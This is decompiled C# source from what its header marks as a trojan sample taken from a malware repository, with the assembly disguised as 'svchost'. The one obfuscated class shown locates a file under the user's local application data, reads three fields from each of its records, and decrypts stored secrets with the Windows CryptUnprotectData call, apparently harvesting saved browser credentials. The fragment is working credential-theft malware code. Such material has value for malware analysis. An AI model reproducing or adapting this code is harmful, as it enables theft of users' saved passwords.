// Decompiled with JetBrains decompiler
// Type: 
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 422D1FBC-502B-4DB7-AC18-B994031CE62D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.Win32.Generic-7709a3ed96ddad83c1364a32bd84290b3d00212a09fc6619f0588d3725c06799.exe

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

internal sealed class \u000F
{
  private static IntPtr \u0002 = (IntPtr) 0;

  public static void \u0002(bool _param0)
  {
    string path = !_param0 ? Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + \u0008\u2003.\u0002(415306286) : Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + \u0008\u2003.\u0002(415306353);
    if (!File.Exists(path))
      return;
    \u000F.\u0002(path, _param0);
  }

  public static void \u0002(string _param0, bool _param1)
  {
    \u0003\u2003 obj = new \u0003\u2003(_param0);
    obj.\u0002(\u0008\u2003.\u0002(415306256));
    for (int index = 0; index <= obj.\u0002() - 1; ++index)
    {
      string str1 = obj.\u0002(index, \u0008\u2003.\u0002(415306733));
      string str2 = obj.\u0002(index, \u0008\u2003.\u0002(415306750));
      string str3 = \u000F.\u0002(Encoding.Default.GetBytes(obj.\u0002(index, \u0008\u2003.\u0002(415306691))));
      if (_param1)
        \u000E\u2000.\u0002.Add(new \u0005\u2000(\u0008\u2003.\u0002(415306664), str1, str2, str3, string.Empty));
      else
        \u000E\u2000.\u0002.Add(new \u0005\u2000(\u0008\u2003.\u0002(415306663), str1, str2, str3, string.Empty));
    }
  }

  [DllImport("crypt32.dll", EntryPoint = "CryptUnprotectData", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern bool \u0002(
    ref \u000F.\u0003 _param0,
    string _param1,
    ref \u000F.\u0003 _param2,
    IntPtr _param3,
    ref \u000F.\u0002 _param4,
    int _param5,
    ref \u000F.\u0003 _param6);

  public static string \u0002(byte[] _param0)
  {
    \u000F.\u0003 obj1 = new \u000F.\u0003();
    \u000F.\u0003 obj2 = new \u000F.\u0003();
    \u000F.\u0002 obj3 = new \u000F.\u0002();
    GCHandle gcHandle = GCHandle.Alloc((object) _param0, GCHandleType.Pinned);
    \u000F.\u0003 obj4;
    obj4.\u0003 = gcHandle.AddrOfPinnedObject();
    obj4.\u0002 = _param0.Length;
    gcHandle.Free();
    \u000F.\u0002(ref obj4, string.Empty, ref obj2, IntPtr.Zero, ref obj3, 0, ref obj1);
    byte[] numArray = new byte[obj1.\u0002];
    Marshal.Copy(obj1.\u0003, numArray, 0, obj1.\u0002);
    return Encoding.Default.GetString(numArray);
  }

  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
  internal struct \u0002
  {
    public int \u0002;
    public int \u0003;
    public IntPtr \u0005;
    public string \u0008;
  }

  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
  internal struct \u0003
  {
    public int \u0002;
    public IntPtr \u0003;
  }
}
